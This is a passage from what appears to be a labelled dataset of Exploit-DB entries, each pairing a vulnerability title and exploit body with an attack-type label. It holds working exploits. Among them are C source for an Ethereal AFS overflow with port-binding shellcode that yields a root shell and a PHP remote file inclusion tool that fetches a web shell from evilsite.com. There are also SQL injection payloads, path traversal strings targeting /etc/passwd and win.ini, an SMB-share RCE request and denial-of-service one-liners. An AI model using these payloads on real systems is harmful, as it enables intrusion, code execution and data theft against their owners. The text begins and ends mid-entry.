seh=""\xee\x04\x01\x66"" #Jump back 603 bytes due to insufficient space for shellcode jmpbck = ""\xe9\xA5\xfd\xff\xff"" junk = (""D"" * 55)  f= open(""exploit.m3u"",'w') f.write(buffer + nseh + seh + jmpbck + junk) f.close()",Local Buffer Overflow,1
38292,"refbase 0.9.6 - Multiple Vulnerabilities # Exploit Title: Refbase <= 0.9.6 rss.php where parameter SQL Injection # Google Dork: ""powered by refbase"" # Date: 23 Sep 2015 # Exploit Author: Mohab Ali # @0xAli # Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database # Software Link: http://sourceforge.net/projects/refbase/ # Reference: https://www.kb.cert.org/vuls/id/374092 # Version: 0.8, 0.9, 0.9.5, 0.9.6 # Tested on: WAMP (Windows) # CVE : CVE-2015-6009 # Solution: Vulnerability hasn't been patched yet.  **Summary ** Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.   ** Vulnerable code ** ################################################################################ #Line 35 : $queryWhereClause = $_REQUEST['where']; #Line 86 : $sanitizedWhereClause = extractWHEREclause("" WHERE "" . $queryWhereClause); #Line 100: $sqlQuery .= "" FROM $tableRefs WHERE "" . $sanitizedWhereClause; #Line 123: $result = queryMySQLDatabase($query); ################################################################################  ** Exploit POCs ** /rss.php?where=1+and+5=(substr(@@version,1,1))-- -If it’s true then the mysql version is > 5 /rss.php?where='nonexistent'+union+all(select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat('version:',@@version,''),34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50)-- - /rss.php?where='nonexistent'+union+all(select+1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41)-- -   [!] Version 0.8 and 0.9 provide no validation, but versions 0.9.5 and 0.9.6 provide some filtering so you better let sqlmap handle it. [!] The GET parameter ""where"" is vulnerable to SQL injection despite being filtered by a custom function called extractWHEREclause() it’s still can be bypassed to inject other queries. The extractWHEREclause() function which is defined in include.inc.php and it removes any additional MySQL keywords. preg_replace(""/^.*? WHERE (.+?)(?= ORDER BY| LIMIT| GROUP BY| HAVING| PROCEDURE| FOR UPDATE| LOCK IN|[ ;]+(SELECT|INSERT|UPDATE|DELETE|CREATE|ALTER|DROP|FILE)\b|$).*?$/i"", ""\\1"", $query); But it can be bypassed.   # Contacted vendor: 23 Dec 2014 # Public disclosure: 23 Sep 2015 		  ################################################################################  # Exploit Title: Refbase <= 0.9.6 install.php defaultCharacterSet parameter SQL Injection # Google Dork: ""powered by refbase"" # Public Disclosure Date: 21 Sep 2015 # Exploit Author: Mohab Ali # @0xAli # Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database # Software Link: http://sourceforge.net/projects/refbase/ # Reference: https://www.kb.cert.org/vuls/id/374092 # Version: 0.8, 0.9, 0.9.5, 0.9.6. # Tested on: WAMP (Windows) # CVE : CVE-2015-6009 # Solution: Remove the install.php file after the installation  **Summary ** Refbase v 0.9.6 and earlier versions have an SQL injection vulnerability because of the insufficient validation when passing user supplied input to be passed to the database.  [!] You have to know the correct MySQL credentials.  ** Vulnerable code ** ################################################################################ #Line 77 :  $defaultCharacterSet = $_POST['defaultCharacterSet']; #Line 407: $queryCreateDB = $queryCreateDB . "" DEFAULT CHARACTER SET "" . $defaultCharacterSet; #Line 424: if (!($result = @ mysql_query ($queryCreateDB, $connection))) ################################################################################  ** Exploit POC **  Request: POST /install.php formType=install&submit=Install&adminUserName=root&adminPassword=pass&pathToMYSQL=C:\mysql5.6.17\bin\mysql.exe&databaseStructureFile=./install.sql&pathToBibutils=&defaultCharacterSet=SQL QUERY HERE&submit=Install  ################################################################################  # Exploit Title: Refbase <= 0.9.6 install.php pathToMYSQL parameter RCE (Windows) # Google Dork: ""powered by refbase"" # Public Disclosure Date: 21 Sep 2015 # Exploit Author: Mohab Ali # @0xAli # Vendor Homepage: http://www.refbase.net/index.php/Web_Reference_Database # Software Link: http://sourceforge.net/projects/refbase/ # Reference: https://www.kb.cert.org/vuls/id/374092 # Version: 0.9.6 and earlier. 0.6.1 and prior versions are not vulnerable. # Tested on: Windows # CVE : CVE-2015-6008 # Solution: Remove the install.php file after the installation  **Summary ** Refbase v 0.9.6 and earlier versions have an RCE vulnerability because of the insufficient validation when passing user supplied input to be executed by the system.  [!] You have to know the correct MySQL credentials and this doesn't appear to be exploitable on Linux since (AFAIK) it can't execute scripts remote smb shares by default.   ** Vulnerable code ** ################################################################################ #Line 62: $pathToMYSQL = $_POST['pathToMYSQL']; #Line 67: $databaseStructureFile = $_POST['databaseStructureFile']; #Line 429: exec($pathToMYSQL . "" -h "" . $hostName . "" -u "" . $adminUserName . "" -p"" .$adminPassword . "" --database="" . $databaseName . "" < "" . $databaseStructureFile . "" 2>&1"", $resultArray); ################################################################################  [*] pathToMYSQL and databaseStructureFile can't be empty, and has to be real file. And they can't contain ';' or '|' [*] To exploit this in Windows you can provide an executable on a remote share and execute it.  ** Exploit POC **  Request: formType=install&submit=Install&adminUserName=root&adminPassword=123&pathToMYSQL=%5C%5CSERVER_IP%5CShare%5Cexec.bat&databaseStructureFile=.%2Finstall.sql&pathToBibutils=&defaultCharacterSet=latin1&submit=Install  Executed command: \\SERVER_IP\Share\exec.bat -h localhost -u root -p123 --database=literature < ./install.sql 2>&1",SQL injection,1
3949,"MolyX BOARD 2.5.0 - 'index.php?lang' Local File Inclusion =============== MolyX BOARD 2.5.0 Local File Inclusion ==== Possibly other versions  =============== Vulnerability found by MurderSkillz ==============================================  =============== d0rk ""Powered by MolyX BOARD 2.5.0"" =========================================  =============== Website: g00ns.net g00ns-forum.net ============================================  =============== Irc: irc.exploitercode.com:6667 ts: ts.g00ns.net ====================================  =============== Script website: molyx.com ====================================================  ############### Exploit ###################################################################  www.victim.com/[path to board if any]/index.php?lang=../../../../../../../../etc/passwd%00  This Vulnerability takes place in pretty much every file in this webapp...  ########################################################################################  Shouts: FiSh,sCuZz, sick, clorox, z3r0, katalyst, SyNiCaL, overdose, pr0be, Trintitty, rezen, str0ke and everyone else at g00ns.net that I forgot..  # milw0rm.com [2007-05-18]",Local File Inclusion,1
20414,"Ethereal - AFS Buffer Overflow /* source: https://www.securityfocus.com/bid/1972/info  Ethereal is a network auditing utility originally written by Gerald Combs. A problem exists in the Ethereal package which can allow a remote user to execute code.  The problem exists in the AFS packet parsing routine. An algorithm string scans the contents of a packet into a predefined buffer, not checking to see if the size of the string exceeds the buffer size. It is therefore possible to overwrite other values on the stack including the return address. This problem makes it possible for a malicious user to execute code with a custom crafted packet. */   /* Name: Ethereal 0.8.13 AFS ACL buffer overflow exploit Author:  http://hacksware.com  mat@hacksware.com  gcc -o sbo_ethereal sbo_ethereal.c Usage:  ./sbo_ethereal <dest_addr>    dest_addr is the destination address of the host which traffic the victim host running ethereal program can monitor.  Greetz to: Mastrippolito,Trino,s3ung,gumpjin,w00we_mc2,jgotts,luciano,etc...  I used some network codes from synk4.c. */  #include <signal.h> #include <stdio.h> #include <netdb.h> #include <sys/types.h> #include <sys/time.h> #include <netinet/in.h> #include <netinet/ip.h> #include <linux/tcp.h> #include <linux/udp.h>  /*shell code from http://www.hack.co.za/c0de/linux-x86/portshell.c*/ /* port binding shell on 36864*/  /*  *  Linux/x86  *  TCP/36864 portshell (old, could be optimized further)  */  char c0de[] = /* main: */ ""\xeb\x72""                                /* jmp callz               */ /* start: */ ""\x5e""                                    /* popl %esi               */    /* socket() */ ""\x29\xc0""                                /* subl %eax, %eax         */ ""\x89\x46\x10""                            /* movl %eax, 0x10(%esi)   */ ""\x40""                                    /* incl %eax               */ ""\x89\xc3""                                /* movl %eax, %ebx         */ ""\x89\x46\x0c""                            /* movl %eax, 0x0c(%esi)   */ ""\x40""                                    /* incl %eax               */ ""\x89\x46\x08""                            /* movl %eax, 0x08(%esi)   */ ""\x8d\x4e\x08""                            /* leal 0x08(%esi), %ecx   */ ""\xb0\x66""                                /* movb $0x66, %al         */ ""\xcd\x80""                                /* int $0x80               */    /* bind() */ ""\x43""                                    /* incl %ebx               */ ""\xc6\x46\x10\x10""                        /* movb $0x10, 0x10(%esi)  */ ""\x66\x89\x5e\x14""                        /* movw %bx, 0x14(%esi)    */ ""\x88\x46\x08""                            /* movb %al, 0x08(%esi)    */ ""\x29\xc0""                                /* subl %eax, %eax         */ ""\x89\xc2""                                /* movl %eax, %edx         */ ""\x89\x46\x18""                            /* movl %eax, 0x18(%esi)   */ ""\xb0\x90""                                /* movb $0x90, %al         */ ""\x66\x89\x46\x16""                        /* movw %ax, 0x16(%esi)    */ ""\x8d\x4e\x14""                            /* leal 0x14(%esi), %ecx   */ ""\x89\x4e\x0c""                            /* movl %ecx, 0x0c(%esi)   */ ""\x8d\x4e\x08""                            /* leal 0x08(%esi), %ecx   */ ""\xb0\x66""                                /* movb $0x66, %al         */ ""\xcd\x80""                                /* int $0x80               */    /* listen() */ ""\x89\x5e\x0c""                            /* movl %ebx, 0x0c(%esi)   */ ""\x43""                                    /* incl %ebx               */ ""\x43""                                    /* incl %ebx               */ ""\xb0\x66""                                /* movb $0x66, %al         */ ""\xcd\x80""                                /* int $0x80               */    /* accept() */ ""\x89\x56\x0c""                            /* movl %edx, 0x0c(%esi)   */ ""\x89\x56\x10""                            /* movl %edx, 0x10(%esi)   */ ""\xb0\x66""                                /* movb $0x66, %al         */ ""\x43""                                    /* incl %ebx               */ ""\xcd\x80""                                /* int $0x80               */    /* dup2(s, 0); dup2(s, 1); dup2(s, 2); */ ""\x86\xc3""                                /* xchgb %al, %bl          */ ""\xb0\x3f""                                /* movb $0x3f, %al         */ ""\x29\xc9""                                /* subl %ecx, %ecx         */ ""\xcd\x80""                                /* int $0x80               */ ""\xb0\x3f""                                /* movb $0x3f, %al         */ ""\x41""                                    /* incl %ecx               */ ""\xcd\x80""                                /* int $0x80               */ ""\xb0\x3f""                                /* movb $0x3f, %al         */ ""\x41""                                    /* incl %ecx               */ ""\xcd\x80""                                /* int $0x80               */    /* execve() */ ""\x88\x56\x07""                            /* movb %dl, 0x07(%esi)    */ ""\x89\x76\x0c""                            /* movl %esi, 0x0c(%esi)   */ ""\x87\xf3""                                /* xchgl %esi, %ebx        */ ""\x8d\x4b\x0c""                            /* leal 0x0c(%ebx), %ecx   */ ""\xb0\x0b""                                /* movb $0x0b, %al         */ ""\xcd\x80""                                /* int $0x80               */  /* callz: */ ""\xe8\x89\xff\xff\xff""                    /* call start              */ ""/bin/sh"";  /*                    www.hack.co.za           [7 August 2000]*/ unsigned long getaddr (char *name) {   struct hostent *hep;    hep = gethostbyname (name);   if (!hep)     {       fprintf (stderr, ""Unknown host %s\n"", name);       exit (1);     }   return *(unsigned long *) hep->h_addr; }  unsigned short ip_sum (u_short * addr, int len) {   register int nleft = len;   register u_short *w = addr;   register int sum = 0;   u_short answer = 0;    while (nleft > 1)     {       sum += *w++;       nleft -= 2;     }   if (nleft == 1)     {       *(u_char *) (&answer) = *(u_char *) w;       sum += answer;     }   sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */   sum += (sum >> 16);           /* add carry */   answer = ~sum;                /* truncate to 16 bits */   return (answer); }  void send_udp_segment (int raw_socket,struct iphdr *iphdr_p, struct udphdr *udphdr_p, char *data, int dlen) {   char buf[65536];   struct   {                             /* rfc 793 udp pseudo-header */     unsigned long saddr, daddr;     char mbz;     char ptcl;     unsigned short udpl;   }   ph;    struct sockaddr_in sin;    ph.saddr = iphdr_p->saddr;   ph.daddr = iphdr_p->daddr;   ph.mbz = 0;   ph.ptcl = IPPROTO_TCP;   ph.udpl = htons (sizeof (*udphdr_p) + dlen);    memcpy (buf, &ph, sizeof (ph));   memcpy (buf + sizeof (ph), udphdr_p, sizeof (*udphdr_p));   memcpy (buf + sizeof (ph) + sizeof (*udphdr_p), data, dlen);   memset (buf + sizeof (ph) + sizeof (*udphdr_p) + dlen, 0, 4);   udphdr_p->check = ip_sum (buf, (sizeof (ph) + sizeof (*udphdr_p) + dlen + 1) & ~1);    memcpy (buf, iphdr_p,4*iphdr_p->ihl);   memcpy (buf + 4 * iphdr_p->ihl, udphdr_p, sizeof (*udphdr_p));   memcpy (buf + 4 * iphdr_p->ihl + sizeof (*udphdr_p), data, dlen);   memset (buf + 4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen, 0, 4);    iphdr_p->check = ip_sum (buf, (4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen + 1) & ~1);   memcpy (buf, iphdr_p, 4 * iphdr_p->ihl);    sin.sin_family = AF_INET;   sin.sin_port = udphdr_p->dest;   sin.sin_addr.s_addr = iphdr_p->daddr;    if (sendto(raw_socket, buf, 4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen, 0, &sin,sizeof (sin)) < 0)     {       printf (""Error sending syn packet.\n"");       perror ("""");       exit (1);     } }  unsigned long send_udp_afs_data (int raw_socket,unsigned long src_addr, unsigned short src_port,             unsigned long dst_addr, unsigned short dst_port) {   struct iphdr iphdr_d;   struct udphdr udphdr_d;    typedef unsigned int guint32;   typedef unsigned short guint16; /*header from ethereal*/ struct rx_header {         guint32 epoch;         guint32 cid;         guint32 callNumber;         guint32 seq;         guint32 serial;         u_char type; #define RX_PACKET_TYPE_DATA             1 #define RX_PACKET_TYPE_ACK              2 #define RX_PACKET_TYPE_BUSY             3 #define RX_PACKET_TYPE_ABORT            4 #define RX_PACKET_TYPE_ACKALL           5 #define RX_PACKET_TYPE_CHALLENGE        6 #define RX_PACKET_TYPE_RESPONSE         7 #define RX_PACKET_TYPE_DEBUG            8 #define RX_PACKET_TYPE_PARAMS           9 #define RX_PACKET_TYPE_VERSION          13         u_char flags; #define RX_CLIENT_INITIATED 1 #define RX_REQUEST_ACK 2 #define RX_LAST_PACKET 4 #define RX_MORE_PACKETS 8 #define RX_FREE_PACKET 16         u_char userStatus;         u_char securityIndex;         guint16 spare;                  /* How clever: even though the AFS */         guint16 serviceId;              /* header files indicate that the */ };                                      /* serviceId is first, it's really */                                         /* encoded _after_ the spare field */                                         /* I wasted a day figuring that out! */   struct rx_header rx_header_d;   int afs_data_len;   char *afs_data;   int data_len;   char *data_buffer;     iphdr_d.version = 4;   iphdr_d.ihl = 5;   iphdr_d.tos = 0;   iphdr_d.tot_len = sizeof (iphdr_d)+sizeof(udphdr_d);   iphdr_d.id = htons(545);   iphdr_d.frag_off = 0;   iphdr_d.ttl = 90;   iphdr_d.protocol = IPPROTO_UDP;   iphdr_d.check = 0;   iphdr_d.saddr = src_addr;   iphdr_d.daddr = dst_addr;    udphdr_d.source = htons (src_port);   udphdr_d.dest = htons (dst_port);   udphdr_d.len = 2;   udphdr_d.check = 0;    rx_header_d.epoch=htonl(0);   rx_header_d.cid=htonl(1);   rx_header_d.callNumber=htonl(2);   rx_header_d.seq=htonl(3);   rx_header_d.serial=htonl(4);    rx_header_d.type=RX_PACKET_TYPE_DATA;   rx_header_d.flags=RX_CLIENT_INITIATED;   rx_header_d.userStatus=6;   rx_header_d.securityIndex=7;   rx_header_d.spare=htons(8);   rx_header_d.serviceId=htons(9);    { #define DATA_SIZE 600 //Data portion size    u_long datasize=htonl(DATA_SIZE);    afs_data_len=4*5+DATA_SIZE;    /*      UINT opcode      UINT volume      UINT vnode      UINT uniqifier      UINT datasize      data section      pos(%d) neg (%d)      pos times*( user(%s), &acl(%d))      neg times*( user(%s), &acl(%d))    */     afs_data=(char *)calloc(1,afs_data_len);    if(afs_data)    {     u_long opcode=htonl(134);     int i;     int cur_pos; #define CODE_LEN 300     char code_buf[CODE_LEN];     unsigned long esp=0x81c6f02; #define RET_ADDR_POS 150     int offset=RET_ADDR_POS+20;      for(i=0;i<=RET_ADDR_POS;i+=4)        *(long *)&code_buf[i]=(unsigned long)esp+offset;     memset(code_buf+RET_ADDR_POS,0x90,CODE_LEN-RET_ADDR_POS); //insert NOP CODES     memcpy(code_buf+CODE_LEN-strlen(c0de),c0de,strlen(c0de));      memcpy(afs_data,(char *)&opcode,sizeof(u_long));     memcpy(afs_data+4*4,(char *)&datasize,sizeof(u_long));     sprintf(afs_data+4*5,""%d %d %s %d"",1,1,""hi"",1);      cur_pos=4*5+strlen(afs_data+4*5);     memcpy(afs_data+cur_pos,code_buf,CODE_LEN);     sprintf(afs_data+cur_pos+CODE_LEN,"" %d"",1);      data_len=sizeof(struct rx_header)+afs_data_len;     data_buffer=(char *)calloc(1,data_len);     if(data_buffer)     {      memcpy(data_buffer,(char *)&rx_header_d,sizeof(struct rx_header));      memcpy(data_buffer+sizeof(struct rx_header),afs_data,afs_data_len);      send_udp_segment (raw_socket,&iphdr_d,&udphdr_d,data_buffer,data_len);      free(data_buffer);     }     free(afs_data);    }   } }  main (int argc, char **argv) {   u_short src_port, dst_port;   unsigned long src_addr, dst_addr;   int raw_socket;    if(argc<2)   {    printf(""%s dst_addr\n"",argv[0]);    fflush(stdout);    exit(1);   }   src_addr = getaddr (""1.1.1.1"");   dst_addr = getaddr (argv[1]);   src_port = 10;   dst_port = 7000;    raw_socket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);   if (raw_socket < 0)     {       perror (""socket (raw)"");       exit (1);     }    send_udp_afs_data (raw_socket,src_addr, src_port, dst_addr, dst_port); }  /*  If the attack was successful you can get in the system like this. matt:~# telnet victim 36864 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. id; uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)   */",AFS Buffer Overflow,1
44345,Acrolinx Server < 5.2.5 - Directory Traversal # Exploit Title: Acrolinx Dashboard Directory Traversal # CVE: CVE 2018-7719 # Date: 19.02.2017 # Exploit Author: Berk Dusunur # Vendor Homepage: www.acrolinx.com # Version:Before 5.2.5  PoC  Acrolinx dashboard windows works on the server.   http://localhost/..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini  http://www.berkdusunur.net/2018/03/tr-en-acrolinx-dashboard-directory.html,Dashboard Directory Traversal,1
45082,"Nagios Core 4.4.1 - Denial of Service # Exploit Title: Nagios Core Multiple Local Denial of Service # Date: 2018-07-09 # Exploit Author: Fakhri Zulkifli (@d0lph1n98) # Vendor Homepage: https://www.nagios.org/ # Software Link: https://www.nagios.org/downloads/nagios-core/ # Version: 4.4.1 and earlier # Tested on: 4.4.1   qh_core, qh_help, and qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.  1. [CVE-2018-13458] qh_core  $ echo -ne “#core\0"" | socat unix-connect:./poc/nagios.qh - $ echo -ne “@core\0"" | socat unix-connect:./poc/nagios.qh -  2. [CVE-2018-13457] qh_echo  $ echo -ne ""#echo\0"" | socat unix-connect:./poc/nagios.qh - $ echo -ne “@echo\0"" | socat unix-connect:./poc/nagios.qh -  3. [CVE-2018-13441] qh_help  $ echo -ne “#help\0"" | socat unix-connect:./poc/nagios.qh - $ echo -ne “@help\0"" | socat unix-connect:./poc/nagios.qh -",NULL pointer dereference,1
38277,Microsoft Windows Kernel - 'bGetRealizedBrush' Use-After-Free (MS15-097) Source: https://code.google.com/p/google-security-research/issues/detail?id=458  --- The attached testcase crashes Win 7 with Special Pool on win32k while accessing freed memory in bGetRealizedBrush​​. ---  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38277.zip,Use-After-Free,1
2944,"VerliAdmin 0.3 - 'index.php' Remote File Inclusion <?     /* P.S Chcialem serdecznie niepozdrowic wszystkie kurwy takie jak Ne0 i jego dziwki!! Mam was w dupie, a Ty Ne0 pryszczu jebany pogodz sie z porazka bo to ja zawsze bede lepszy od Ciebie! Nie pozdrawiam tez wszystkie gnidy jakie chowaja sie na swoich smiesznych hubach DC, jestescie poprostu smieszni... Cale to ZOO pozdrawiam srodkowym palcem H.W.D.Cale Direct Connect PL   by Kacper & DEVIL TEAM */        //Kacper Settings  $exploit_name = ""VerliAdmin <= 0.3 File Include Exploit""; $script_name = ""VerliAdmin 0.3""; $script_site = ""http://bohyn.czechweb.cz/""; $dork = 'allinurl:""verliadmin""'; //**************************************************************   print ' :::::::::  :::::::::: :::     ::: ::::::::::: :::         :+:    :+: :+:        :+:     :+:     :+:     :+:         +:+    +:+ +:+        +:+     +:+     +:+     +:+         +#+    +:+ +#++:++#   +#+     +:+     +#+     +#+         +#+    +#+ +#+         +#+   +#+      +#+     +#+         #+#    #+# #+#          #+#+#+#       #+#     #+#         #########  ##########     ###     ########### ##########  ::::::::::: ::::::::::     :::     ::::    ::::       :+:     :+:          :+: :+:   +:+:+: :+:+:+      +:+     +:+         +:+   +:+  +:+ +:+:+ +:+      +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+      +#+     +#+        +#+     +#+ +#+       +#+      #+#     #+#        #+#     #+# #+#       #+#      ###     ########## ###     ### ###       ###  	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -    [Exploit name: '.$exploit_name.' [Script name: '.$script_name.' [Script site: '.$script_site.' dork: '.$dork.'  Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon | friend str0ke ;)  Blund Coder, D0han, d3m0n, D3m0n (ziom z Niemiec :P), dn0de, DUREK5, fdj, Grzegorz, GrZyB997, konsol, Mandr4ke, mass, michalind, mIvus, Nua, nukedclx, pepi, QunZ, Qw3rty, RebeL, SkD, Adam, arkadius, asteroid, blue, Ci2u, CrazzyIwan, DMX, drzewko, ExTrEmE][-][ack, Gelo, Kicaj, Larry, Leito, LEON, Michas, Morpheus, MXZ, Ramzes, redsaq, TomZen   and   Dr Max Virus TamTurk, hackersecurity.org  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';  if ($argc<6) { print (' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Usage: php '.$argv[0].' host shell nick pass cmd OPTIONS host:      script server (ip/hostname) shell:     path to shell nick:      You username in hub pass:      You username password cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' localhost http://www.evilsite.com/shell.txt Hauru zamek ls -la -P1.1.1.1:80 shell.txt: <?php ob_clean();echo""Hacker_Kacper_Made_in_Poland!!..Hauru..^_^..the..best..polish..team..Greetz"";ini_set(""max_execution_time"",0);echo ""hauru"";passthru($_GET[""cmd""]);die;?> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '); die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpackets($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock);   #debug   #echo ""\r\n"".$html; } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $shell=$argv[2]; $nick=$argv[3]; $password=$argv[4]; $cmd="""";  $port=80; $proxy=""""; for ($i=5; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } }  if ($proxy=='') {$p='http://'.$host.':'.$port;}  $num1 = Rand(97, 122); $num2 = Rand(65, 90); $pass = Crypt($password, Chr($num1).Chr($num2));  $packet =""GET "".$p.""index.php?q="".$shell.""?cmd="".$cmd.""%00 HTTP/1.0\r\n""; $pakiet.=""Cookie: brwsr_tp=Opera;\r\n""; $pakiet.=""Cookie: lang=pl;\r\n""; $pakiet.=""Cookie: login=1;\r\n""; $pakiet.=""Cookie: nick="".$nick."";\r\n""; $pakiet.=""Cookie: password="".$pass."";\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpackets($packet); if (strstr($html,""hauru"")) { $temp=explode(""hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(\n""; echo ""Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\n""; ?>  # milw0rm.com [2006-12-18]",Remote File Inclusion,1
29808,"PHP 5.1.6 - 'Msg_Receive()' Memory Allocation Integer Overflow source: https://www.securityfocus.com/bid/23236/info  PHP is prone to an integer-overflow vulnerability because it fails to ensure that integer values aren't overrun. Attackers may exploit this issue to cause a buffer overflow and to corrupt process memory.  Exploiting this issue may allow attackers to execute arbitrary machine code in the context of the affected application. Failed exploit attempts will likely result in a denial-of-service condition.  This issue affects PHP versions prior to 4.4.5 and 5.2.1.   <?php    $MSGKEY = 519052;    $msg_id = msg_get_queue ($MSGKEY, 0600);    if (!msg_send ($msg_id, 1, 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH', false, true, $msg_err))     echo ""Msg not sent because $msg_err\n"";    if (msg_receive ($msg_id, 1, $msg_type, 0xffffffff, $_SESSION, false, 0, $msg_error)) {     echo ""$msg\n"";   } else {     echo ""Received $msg_error fetching message\n"";     break;   }    msg_remove_queue ($msg_id);  ?>",Memory Allocation Integer Overflow,1
47926,"Rukovoditel Project Management CRM 2.5.2 - 'reports_id' SQL Injection # Exploit Title: Rukovoditel Project Management CRM 2.5.2 - 'reports_id' SQL Injection # Google Dork: N/A # Date: 2020-01-15 # Blog: https://fatihhcelik.blogspot.com/ # Exploit Author: Fatih Çelik # Vendor Homepage: https://www.rukovoditel.net/ # Software Link: https://sourceforge.net/projects/rukovoditel/ # Version: 2.5.2 # Tested on: Kali Linux # CVE : N/A  # Request,  POST /ruko/index.php?module=items/listing HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/ruko/index.php?module=reports/view&reports_id=68%27 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 330 Connection: close Cookie: cookie_test=please_accept_for_session; sid=3jnq6vg6ovl2cq0ojpsff4vaol; hblid=9P5zBGVwXwPEgj9L3m39N0U0I0A6O221; olfsk=olfsk14190220759411198; xoadmstyle=silver  redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1  # PAYLOADS,  # Parameter: reports_id (POST) # Type: boolean-based blind # Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause  Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' RLIKE (SELECT (CASE WHEN (9654=9654) THEN 68 ELSE 0x28 END))-- AlKt&listing_container=entity_items_listing68_23&page=1&search_keywords=cvjm%C3%B6nb%C3%B6m%C3%B6nm&use_search_fields=184&search_in_comments=false&search_in_all=false&search_type_and=false&search_type_match=false&search_reset=&listing_order_fields=&has_with_selected=1  # Type: error-based # Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)  Payload: redirect_to=report_68&path=23&reports_entities_id=23&reports_id=68' AND (SELECT 8112 FROM(SELECT COUNT(*),CONCAT(0x716b706a71,(SELECT 